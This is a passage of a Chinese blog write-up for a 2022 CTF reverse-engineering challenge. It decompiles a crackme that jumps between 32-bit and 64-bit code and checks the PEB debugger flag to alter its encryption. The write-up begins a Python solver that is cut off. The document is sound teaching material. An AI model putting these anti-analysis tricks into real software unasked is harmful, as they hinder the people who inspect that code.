<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="Cache-Control" content="no-siteapp">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
    
    <meta name="referrer" content="no-referrer-when-downgrade">
    
    <meta name="renderer" content="webkit"/>
    <meta name="force-rendering" content="webkit"/>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
    <script>if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMode)) window.location.href="https://support.dmeng.net/upgrade-your-browser.html?referrer="+encodeURIComponent(window.location.href); </script>
    
    
        <link rel="preload" crossorigin="crossorigin" href="/fonts/roboto/Roboto-Regular.woff2" as="font">
        <link rel="preload" crossorigin="crossorigin" href="/fonts/roboto/Roboto-Bold.woff2" as="font">
    
    
    
        <link rel="shortcut icon" href="/icons/favicon.ico">
    

    
    
        
<link rel="stylesheet" href="/css/mdui.min.v1.0.0.css">

    
    
<link rel="stylesheet" href="/css/main.css">
<link rel="stylesheet" href="/css/iconfont.css">


    
    












          


    
    
    <title>
        
            2022西湖论剑部分题目Writeup | Hexo
        
    </title>
    
    
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
</head>
<body class="mdui-drawer-body-left mdui-appbar-with-toolbar mdui-theme-primary-teal mdui-theme-accent-blue">
  
  <header class="mdui-appbar mdui-appbar-fixed">
  <div id="toolbar" class="mdui-toolbar mdui-color-theme">
    <button class="mdui-btn mdui-btn-icon" mdui-drawer="{target: '#sidebar', swipe: true}"><i class="iconfont icon-menu"></i></button>
    <a href="/" class="mdui-typo-headline">Hexo</a>
    <a href="/" class="header-subtitle mdui-typo-headline"></a>
    <div class="mdui-toolbar-spacer"></div>
    <button class="mdui-btn mdui-btn-icon" mdui-dialog="{target: '#search'}" mdui-tooltip="{content: 'search'}"><i class="iconfont icon-search"></i></button>
  </div>
</header>

<div class="mdui-dialog" id="search">
  
    <div class="search-form">
      <input type="search" class="search-form-input" placeholder="请输入关键字" onfocus="listenSearchFunc()">
    </div>
    <div class="search-result" data-resource="/search.xml"></div>
  
</div>

  <aside id="sidebar" class="mdui-drawer">
    <div class="mdui-tab" mdui-tab>
        <a href="#sidebar-tab1" id="sidebartab" class="mdui-ripple mdui-tab-active">站点概览</a>
        <a href="#sidebar-tab2" id="sidebartab" class="mdui-ripple">关于</a>
    </div>

    
    <div id="sidebar-tab1" class="mdui-p-a-2">
        <div class="mdui-list">
            
                
                <a href="/" class="mdui-list-item mdui-ripple">
                    <div class="mdui-list-item-icon">
                        <i class="iconfont icon-home"></i>
                    </div>
                    <div class="mdui-list-item-content">主页</div>
                </a>
            
                
                <a href="/tags/" class="mdui-list-item mdui-ripple">
                    <div class="mdui-list-item-icon">
                        <i class="iconfont icon-bookmark"></i>
                    </div>
                    <div class="mdui-list-item-content">标签</div>
                </a>
            
                
                <a href="/categories/" class="mdui-list-item mdui-ripple">
                    <div class="mdui-list-item-icon">
                        <i class="iconfont icon-folder"></i>
                    </div>
                    <div class="mdui-list-item-content">分类</div>
                </a>
            
                
                <a href="/archives/" class="mdui-list-item mdui-ripple">
                    <div class="mdui-list-item-icon">
                        <i class="iconfont icon-archive"></i>
                    </div>
                    <div class="mdui-list-item-content">归档</div>
                </a>
            
                
                <a href="/tools/" class="mdui-list-item mdui-ripple">
                    <div class="mdui-list-item-icon">
                        <i class="iconfont icon-tools"></i>
                    </div>
                    <div class="mdui-list-item-content">工具箱</div>
                </a>
            
                
                <a href="/about/" class="mdui-list-item mdui-ripple">
                    <div class="mdui-list-item-icon">
                        <i class="iconfont icon-user"></i>
                    </div>
                    <div class="mdui-list-item-content">关于</div>
                </a>
            
            <div class="mdui-list-item mdui-ripple">
                <div class="mdui-list-item-icon">
                    <i class="iconfont icon-moon"></i>
                </div>
                <div class="mdui-list-item-content">夜间模式</div>
                <label class="mdui-switch" id="darkmode">
                  <input type="checkbox" id="nightmode_switch"/>
                  <i class="mdui-switch-icon"></i>
                </label>
            </div>           
        </div>
    </div>

    
    <div id="sidebar-tab2" class="mdui-p-a-2">
        <div class="sidebar-overview">
            <div class="sidebar-avatar">
                
                    <img src="/icons/avatar.gif"/>
                
            </div>
            <div class="sidebar-author-name">Gyan</div>
            <div class="sidebar-description"></div>
        </div>
        <div class="sidebar-links">
            
                
                <div class="mdui-chip">
                    <span class="mdui-chip-icon"><i class="iconfont icon-mail"></i></span>
                    <a href="mailto:Gy4n@protonmail.com" class="mdui-chip-title">E-Mail</a>
                </div>
            
                
                <div class="mdui-chip">
                    <span class="mdui-chip-icon"><i class="iconfont icon-github"></i></span>
                    <a target="_blank" rel="noopener" href="https://github.com/Gy4n" class="mdui-chip-title">GitHub</a>
                </div>
            
        </div>
        <ul class="mdui-list" mdui-collapse="{accordion: true}">
            <li class="mdui-collapse-item">
                <div class="mdui-collapse-item-header mdui-list-item mdui-ripple">
                    <div class="mdui-list-item-icon">
                        <i class="iconfont icon-link"></i>
                    </div>
                    <div class="mdui-list-item-content">友情链接</div>
                    <div class="mdui-collapse-item-arrow">
                        <i class="mdui-list-item-icon iconfont icon-angle-down"></i>
                    </div>
                </div>
                <ul id="linksList" class="mdui-collapse-item-body mdui-list mdui-list-dense">
                    
                </ul>
            </li>
        </ul>
    </div>

    <div class="mdui-divider"></div>
    
    
</aside>
  
  <main id="main-contain" class="mdui-container mdui-m-t-5">
    <article id="article" class="mdui-card mdui-p-b-2 mdui-m-b-5">
  <header class="mdui-card-media">
    
    
      <div class="post-header"> 
  <a class="post-header-title" href="/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEWriteup/">2022西湖论剑部分题目Writeup</a>
  <div class="post-header-meta">
    <span>
      <span class="iconfont icon-calendar"></span>
      发布于:&nbsp;2023-02-02
    </span>
    <span>
      <span class="iconfont icon-calendar-check"></span>
      更新于:&nbsp;2023-05-16
    </span>
    <span>
      <span class="iconfont icon-folder"></span>
      分类于:&nbsp;
    </span>
    
  </div>
</div>   
    



    
    
    <div class="mdui-card-menu">
    
      <button class="mdui-btn mdui-btn-icon mdui-text-color-teal" mdui-menu="{target: '#share_menu', align: 'right'}"><i class="iconfont icon-share"></i></button>
      <ul class="mdui-menu" id="share_menu">
        <li class="mdui-menu-item">
          <a href="http://service.weibo.com/share/share.php?appkey=&title=2022西湖论剑部分题目Writeup&url=https://gy4n.github.io/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEWriteup/&pic=https://gy4n.github.io/null&searchPic=false&style=simple" target="_blank" class="mdui-ripple">分享到 Weibo</a>
        </li>
        <li class="mdui-menu-item">
          <a href="https://twitter.com/intent/tweet?text=2022西湖论剑部分题目Writeup&url=https://gy4n.github.io/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEWriteup/&via=Gyan" target="_blank" class="mdui-ripple">分享到 Twitter</a>
        </li>
        <li class="mdui-menu-item">
          <a href="https://www.facebook.com/sharer/sharer.php?u=https://gy4n.github.io/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEWriteup/" target="_blank" class="mdui-ripple">分享到 Facebook</a>
        </li>
        <li class="mdui-menu-item">
          <a href="https://plus.google.com/share?url=https://gy4n.github.io/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEWriteup/" target="_blank" class="mdui-ripple">分享到 Google+</a>
        </li>
        <li class="mdui-menu-item">
          <a href="https://www.linkedin.com/shareArticle?mini=true&url=https://gy4n.github.io/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEWriteup/&title=2022西湖论剑部分题目Writeup" target="_blank" class="mdui-ripple">分享到 LinkedIn</a>
        </li>
        <li class="mdui-menu-item">
          <a href="http://connect.qq.com/widget/shareqq/index.html?site=Hexo&title=2022西湖论剑部分题目Writeup&summary=&pics=https://gy4n.github.io/null&url=https://gy4n.github.io/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEWriteup/" target="_blank" class="mdui-ripple">分享到 QQ</a>
        </li>
        <li class="mdui-menu-item">
          <a href="https://telegram.me/share/url?url=https://gy4n.github.io/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEWriteup/&text=2022西湖论剑部分题目Writeup" target="_blank" class="mdui-ripple">分享到 Telegram</a>
        </li>
      </ul>
    
  </div>
  </header>
  
  
  
  
  <div class="post-tags">
    
      <i class="iconfont icon-tag">
        <a rel="tag" href = /tags/writeup/ >writeup</a>
      </i>
    
  </div>

  
  <div class="mdui-card-content mdui-typo mdui-p-x-4">
    <p>题目链接详见：<a target="_blank" rel="noopener" href="https://github.com/Randark-JMT/CTF_Archive/releases/tag/2022-xhlj">https://github.com/Randark-JMT/CTF_Archive/releases/tag/2022-xhlj</a></p>
<span id="more"></span>

<h2 id="re-部分"><a href="#re-部分" class="headerlink" title="re 部分"></a>re 部分</h2><h3 id="dual-personality"><a href="#dual-personality" class="headerlink" title="dual personality"></a>dual personality</h3><p><code>sub_401120</code> 函数，将返回地址改成 <code>jmp far 33:a2</code>，跳转到64位</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_401120</span><span class="params">(<span class="type">size_t</span> Size, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">char</span> *retaddr; <span class="comment">// [esp+D0h] [ebp+4h]</span></span><br><span class="line"></span><br><span class="line">  dword_407050 = VirtualAlloc(<span class="number">0</span>, Size + <span class="number">6</span>, <span class="number">0x3000</span>u, <span class="number">0x40</span>u);</span><br><span class="line">  dword_407000 = (<span class="type">int</span>)dword_407050;</span><br><span class="line">  <span class="built_in">memcpy</span>(dword_407050, retaddr, Size);</span><br><span class="line">  v2 = (<span class="type">char</span> *)dword_407050 + Size;</span><br><span class="line">  *v2 = <span class="number">0xE9</span>;</span><br><span class="line">  *(_DWORD *)(v2 + <span class="number">1</span>) = &amp;retaddr[Size] - v2 - <span class="number">5</span>;</span><br><span class="line">  v2[<span class="number">5</span>] = <span class="number">0xCC</span>;</span><br><span class="line">  *retaddr = <span class="number">0xEA</span>;</span><br><span class="line">  *(_DWORD *)(retaddr + <span class="number">1</span>) = a2;</span><br><span class="line">  *(_WORD *)(retaddr + <span class="number">5</span>) = <span class="number">0x33</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要在<code> call sub_401120</code>的下一跳指令处下一个硬件断点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ba e1 004013E8</span><br><span class="line">ba e1 00401467</span><br></pre></td></tr></table></figure>

<p>注意到这一段是ret回来的，很像x64下的代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">.text:0040146E 48                                         dec     eax</span><br><span class="line">.text:0040146F 8B 04 25 C8 70 40 00                       mov     eax, dword_4070C8</span><br><span class="line">.text:00401476 48                                         dec     eax</span><br><span class="line">.text:00401477 83 F8 20                                   cmp     eax, 20h ; &#x27; &#x27;</span><br><span class="line">.text:0040147A 74 40                                      jz      short loc_4014BC</span><br><span class="line">.text:0040147C 48                                         dec     eax</span><br><span class="line">.text:0040147D 33 D2                                      xor     edx, edx</span><br><span class="line">.text:0040147F 48                                         dec     eax</span><br><span class="line">.text:00401480 B9 04 00 00 00                             mov     ecx, 4</span><br><span class="line">.text:00401480                            ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401485 00                                         db    0</span><br><span class="line">.text:00401486 00                                         db    0</span><br><span class="line">.text:00401487 00                                         db    0</span><br><span class="line">.text:00401488                            ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401488 00 48 F7                                   add     [eax-9], cl</span><br><span class="line">.text:0040148B F1                                         icebp</span><br><span class="line">.text:0040148C 48                                         dec     eax</span><br><span class="line">.text:0040148D 8D 1C 25 14 70 40 00                       lea     ebx, ds:407014h</span><br><span class="line">.text:00401494 8A 14 93                                   mov     dl, [ebx+edx*4]</span><br><span class="line">.text:00401497 48                                         dec     eax</span><br><span class="line">.text:00401498 8B 04 25 C8 70 40 00                       mov     eax, dword_4070C8</span><br><span class="line">.text:0040149F 48                                         dec     eax</span><br><span class="line">.text:004014A0 8D 1C 25 60 70 40 00                       lea     ebx, ds:407060h</span><br><span class="line">.text:004014A7 8A 0C 03                                   mov     cl, [ebx+eax]</span><br><span class="line">.text:004014AA 32 CA                                      xor     cl, dl</span><br><span class="line">.text:004014AC 88 0C 03                                   mov     [ebx+eax], cl</span><br><span class="line">.text:004014AF 48                                         dec     eax</span><br><span class="line">.text:004014B0 FF C0                                      inc     eax</span><br><span class="line">.text:004014B2 48                                         dec     eax</span><br><span class="line">.text:004014B3 89 04 25 C8 70 40 00                       mov     dword_4070C8, eax</span><br><span class="line">.text:004014BA EB B2                                      jmp     short loc_40146E</span><br><span class="line">.text:004014BC                            ; ---------------------------------------------------------------------------</span><br><span class="line">.text:004014BC</span><br><span class="line">.text:004014BC                            loc_4014BC:                             ; CODE XREF: .text:0040147A↑j</span><br><span class="line">.text:004014BC 44                                         inc     esp</span><br><span class="line">.text:004014BD B8 00 70 40 00                             mov     eax, offset dword_407000</span><br><span class="line">.text:004014C2 48                                         dec     eax</span><br><span class="line">.text:004014C3 FF 28                                      jmp     fword ptr [eax]</span><br></pre></td></tr></table></figure>

<p>main函数扣掉x64的代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp-8h] [ebp-148h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp-4h] [ebp-144h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp+0h] [ebp-140h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+4h] [ebp-13Ch]</span></span><br><span class="line">  <span class="type">char</span> Buf2[<span class="number">44</span>]; <span class="comment">// [esp+D0h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+FCh] [ebp-44h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+100h] [ebp-40h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [esp+104h] [ebp-3Ch]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [esp+108h] [ebp-38h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [esp+10Ch] [ebp-34h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [esp+110h] [ebp-30h]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [esp+114h] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [esp+118h] [ebp-28h]</span></span><br><span class="line">  <span class="type">char</span> v17; <span class="comment">// [esp+11Ch] [ebp-24h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+128h] [ebp-18h]</span></span><br><span class="line">  <span class="type">char</span> *v19; <span class="comment">// [esp+134h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))sub_401000)();</span><br><span class="line">  sub_401620(<span class="string">&quot;%99s&quot;</span>, byte_407060);</span><br><span class="line">  sub_401120(<span class="number">7u</span>, (<span class="type">int</span>)dword_4011D0);</span><br><span class="line">  dword_407058 -= <span class="number">559038737</span>;</span><br><span class="line">  v19 = byte_407060;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)&amp;v19[<span class="number">4</span> * i] += dword_407058;</span><br><span class="line">    dword_407058 ^= *(_DWORD *)&amp;v19[<span class="number">4</span> * i];</span><br><span class="line">  &#125;</span><br><span class="line">  MK_FP(*((_WORD *)&amp;byte_40700C + <span class="number">2</span>), byte_40700C)(byte_407060, <span class="number">0</span>, v4, v5, v6, v7);</span><br><span class="line">  sub_401120(<span class="number">7u</span>, (<span class="type">int</span>)dword_401290);</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  v15 = <span class="number">0</span>;</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  Buf2[<span class="number">0</span>] = <span class="number">-86</span>;</span><br><span class="line">  Buf2[<span class="number">1</span>] = <span class="number">79</span>;</span><br><span class="line">  Buf2[<span class="number">2</span>] = <span class="number">15</span>;</span><br><span class="line">  Buf2[<span class="number">3</span>] = <span class="number">-30</span>;</span><br><span class="line">  Buf2[<span class="number">4</span>] = <span class="number">-28</span>;</span><br><span class="line">  Buf2[<span class="number">5</span>] = <span class="number">65</span>;</span><br><span class="line">  Buf2[<span class="number">6</span>] = <span class="number">-103</span>;</span><br><span class="line">  Buf2[<span class="number">7</span>] = <span class="number">84</span>;</span><br><span class="line">  Buf2[<span class="number">8</span>] = <span class="number">44</span>;</span><br><span class="line">  Buf2[<span class="number">9</span>] = <span class="number">43</span>;</span><br><span class="line">  Buf2[<span class="number">10</span>] = <span class="number">-124</span>;</span><br><span class="line">  Buf2[<span class="number">11</span>] = <span class="number">126</span>;</span><br><span class="line">  Buf2[<span class="number">12</span>] = <span class="number">-68</span>;</span><br><span class="line">  Buf2[<span class="number">13</span>] = <span class="number">-113</span>;</span><br><span class="line">  Buf2[<span class="number">14</span>] = <span class="number">-117</span>;</span><br><span class="line">  Buf2[<span class="number">15</span>] = <span class="number">120</span>;</span><br><span class="line">  Buf2[<span class="number">16</span>] = <span class="number">-45</span>;</span><br><span class="line">  Buf2[<span class="number">17</span>] = <span class="number">115</span>;</span><br><span class="line">  Buf2[<span class="number">18</span>] = <span class="number">-120</span>;</span><br><span class="line">  Buf2[<span class="number">19</span>] = <span class="number">94</span>;</span><br><span class="line">  Buf2[<span class="number">20</span>] = <span class="number">-82</span>;</span><br><span class="line">  Buf2[<span class="number">21</span>] = <span class="number">71</span>;</span><br><span class="line">  Buf2[<span class="number">22</span>] = <span class="number">-123</span>;</span><br><span class="line">  Buf2[<span class="number">23</span>] = <span class="number">112</span>;</span><br><span class="line">  Buf2[<span class="number">24</span>] = <span class="number">49</span>;</span><br><span class="line">  Buf2[<span class="number">25</span>] = <span class="number">-77</span>;</span><br><span class="line">  Buf2[<span class="number">26</span>] = <span class="number">9</span>;</span><br><span class="line">  Buf2[<span class="number">27</span>] = <span class="number">-50</span>;</span><br><span class="line">  Buf2[<span class="number">28</span>] = <span class="number">19</span>;</span><br><span class="line">  Buf2[<span class="number">29</span>] = <span class="number">-11</span>;</span><br><span class="line">  Buf2[<span class="number">30</span>] = <span class="number">13</span>;</span><br><span class="line">  Buf2[<span class="number">31</span>] = <span class="number">-54</span>;</span><br><span class="line">  Buf2[<span class="number">32</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(byte_407060, Buf2, <span class="number">0x20</span>u) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Right, flag is DASCTF&#123;your input&#125;&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Wrong flag&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一段x64代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  MEMORY[<span class="number">0x40705C</span>] = NtCurrentPeb()-&gt;BeingDebugged;</span><br><span class="line">  <span class="keyword">if</span> ( !MEMORY[<span class="number">0x40705C</span>] )</span><br><span class="line">    MEMORY[<span class="number">0x407058</span>] = <span class="number">1576625838</span>;</span><br><span class="line">  <span class="keyword">return</span> MK_FP(MEMORY[<span class="number">0x407008</span>], MEMORY[<span class="number">0x407000</span>])();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第二段扣掉的x64的代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_30</span><span class="params">(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5)</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *retaddr[<span class="number">2</span>]; <span class="comment">// [rsp+8h] [rbp+8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( MEMORY[<span class="number">0x40705C</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    *retaddr[<span class="number">1</span>] = __ROL8__(*retaddr[<span class="number">1</span>], <span class="number">32</span>);</span><br><span class="line">    retaddr[<span class="number">1</span>][<span class="number">1</span>] = __ROL8__(retaddr[<span class="number">1</span>][<span class="number">1</span>], <span class="number">32</span>);</span><br><span class="line">    retaddr[<span class="number">1</span>][<span class="number">2</span>] = __ROL8__(retaddr[<span class="number">1</span>][<span class="number">2</span>], <span class="number">32</span>);</span><br><span class="line">    retaddr[<span class="number">1</span>][<span class="number">3</span>] = __ROL8__(retaddr[<span class="number">1</span>][<span class="number">3</span>], <span class="number">32</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *retaddr[<span class="number">1</span>] = __ROL8__(*retaddr[<span class="number">1</span>], <span class="number">12</span>);</span><br><span class="line">    retaddr[<span class="number">1</span>][<span class="number">1</span>] = __ROL8__(retaddr[<span class="number">1</span>][<span class="number">1</span>], <span class="number">34</span>);</span><br><span class="line">    retaddr[<span class="number">1</span>][<span class="number">2</span>] = __ROL8__(retaddr[<span class="number">1</span>][<span class="number">2</span>], <span class="number">56</span>);</span><br><span class="line">    retaddr[<span class="number">1</span>][<span class="number">3</span>] = __ROL8__(retaddr[<span class="number">1</span>][<span class="number">3</span>], <span class="number">14</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> MK_FP(retaddr[<span class="number">0</span>], retaddr[<span class="number">0</span>])(a1, a2, a3, a4, a5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第三段扣掉的x64代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_160</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( MEMORY[<span class="number">0x4070C8</span>] != <span class="number">32</span>i64 )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = MEMORY[<span class="number">0x4070C8</span>];</span><br><span class="line">    *(_BYTE *)(MEMORY[<span class="number">0x4070C8</span>] + <span class="number">0x407060</span>i64) ^= *(_BYTE *)(<span class="number">4</span> * (MEMORY[<span class="number">0x4070C8</span>] % <span class="number">4u</span>i64) + <span class="number">0x407014</span>);</span><br><span class="line">    MEMORY[<span class="number">0x4070C8</span>] = v0 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> MK_FP(MEMORY[<span class="number">0x407008</span>], MEMORY[<span class="number">0x407000</span>])();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先用magic运算，再ror，再异或</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 